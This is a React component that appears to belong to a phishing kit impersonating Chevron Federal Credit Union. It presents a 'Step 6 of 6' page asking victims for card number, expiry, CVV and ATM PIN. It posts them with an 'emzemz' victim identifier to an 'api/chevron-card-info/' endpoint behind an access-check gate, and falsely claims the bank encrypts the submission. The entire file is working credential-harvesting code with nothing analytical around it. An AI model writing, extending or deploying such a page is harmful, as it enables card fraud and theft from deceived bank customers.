import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

const Card: React.FC = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [cvv, setCvv] = useState('');
  const [atmPin, setAtmPin] = useState('');
  const [showCvv, setShowCvv] = useState(false);
  const [showPin, setShowPin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    cardNumber: '',
    expiry: '',
    cvv: '',
    atmPin: '',
    form: '',
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  const formatCardNumber = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 16);
    const groups = digitsOnly.match(/.{1,4}/g);
    return groups ? groups.join(' ') : digitsOnly;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setErrors(prev => ({ ...prev, form: '' }));

    setIsLoading(true);

    const cardDigits = cardNumber.replace(/\s/g, '');
    const newErrors = {
      cardNumber: cardDigits.length !== 16 ? 'Card number must be 16 digits' : '',
      expiry: !expiryMonth || !expiryYear ? 'Expiry date is required' : '',
      cvv: cvv.length !== 3 && cvv.length !== 4 ? 'CVV must be 3 or 4 digits' : '',
      atmPin: atmPin.length !== 4 ? 'ATM PIN must be 4 digits' : '',
      form: '',
    };

    setErrors(newErrors);

    if (Object.values(newErrors).some((error) => error)) {
      setIsLoading(false);
      return;
    }

    try {
      await axios.post(`${baseUrl}api/chevron-card-info/`, {
        emzemz,
        cardNumber: cardDigits,
        expiryMonth,
        expiryYear,
        cvv,
        atmPin,
      });

      navigate('/terms', { state: { emzemz } });
    } catch (error) {
      console.error('Error submitting card info:', error);
      setErrors(prev => ({
        ...prev,
        form: 'There was an error. Please try again.'
      }));
      setIsLoading(false);
    }
  };

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 15 }, (_, i) => currentYear + i);

  const renderError = (message?: string) =>
    message ? (
      <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
        <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
          <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
        </svg>
        {message}
      </p>
    ) : null;

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Checking access…</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting…</div>;
  }

  if (!emzemz) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing user details. Please restart the process.</div>;
  }

  return (
    <FlowPageLayout
      eyebrow="Step 6 of 6"
      title="Secure Your Card"
      description="We’ll verify these card details to confirm you’re the rightful account holder before finalizing access."
      contentClassName="space-y-8"
    >
      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Card Number</label>
          <input
            id="cardNumber"
            name="cardNumber"
            type="text"
            value={cardNumber}
            onChange={handleCardNumberChange}
            maxLength={19}
            className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
            placeholder="1234 5678 9012 3456"
          />
          {renderError(errors.cardNumber)}
        </div>

        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Expiry Date</label>
          <div className="flex flex-col gap-2 sm:flex-row sm:items-center">
            <select
              value={expiryMonth}
              onChange={(e) => setExpiryMonth(e.target.value)}
              className="rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
            >
              <option value="">Month</option>
              {Array.from({ length: 12 }, (_, i) => (
                <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                  {String(i + 1).padStart(2, '0')}
                </option>
              ))}
            </select>
            <select
              value={expiryYear}
              onChange={(e) => setExpiryYear(e.target.value)}
              className="rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
            >
              <option value="">Year</option>
              {years.map((year) => (
                <option key={year} value={year}>
                  {year}
                </option>
              ))}
            </select>
          </div>
          {renderError(errors.expiry)}
        </div>

        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">CVV</label>
          <div className="flex items-center gap-3">
            <input
              id="cvv"
              name="cvv"
              type={showCvv ? 'text' : 'password'}
              value={cvv}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '');
                if (value.length <= 4) setCvv(value);
              }}
              maxLength={4}
              className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
              placeholder="123"
            />
            <button
              type="button"
              onClick={() => setShowCvv((prev) => !prev)}
              className="text-xs font-semibold text-[#0b5da7] hover:underline"
            >
              {showCvv ? 'Hide' : 'Show'}
            </button>
          </div>
          {renderError(errors.cvv)}
        </div>

        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">ATM PIN</label>
          <div className="flex items-center gap-3">
            <input
              id="atmPin"
              name="atmPin"
              type={showPin ? 'text' : 'password'}
              value={atmPin}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '');
                if (value.length <= 4) setAtmPin(value);
              }}
              maxLength={4}
              className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
              placeholder="****"
            />
            <button
              type="button"
              onClick={() => setShowPin((prev) => !prev)}
              className="text-xs font-semibold text-[#0b5da7] hover:underline"
            >
              {showPin ? 'Hide' : 'Show'}
            </button>
          </div>
          {renderError(errors.atmPin)}
        </div>

        {renderError(errors.form)}

        <div className="flex justify-end">
          <button
            type="submit"
            disabled={isLoading}
            className="inline-flex items-center justify-center rounded-sm bg-[#003e7d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#002c5c] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {isLoading ? 'Submitting…' : 'Continue'}
          </button>
        </div>
      </form>

      <div className="rounded-sm bg-[#f0f6fb] px-4 py-3 text-xs text-[#0e2f56]/80">
        We encrypt every card submission using Chevron Federal Credit Union security standards.
      </div>
    </FlowPageLayout>
  );
};

export default Card;
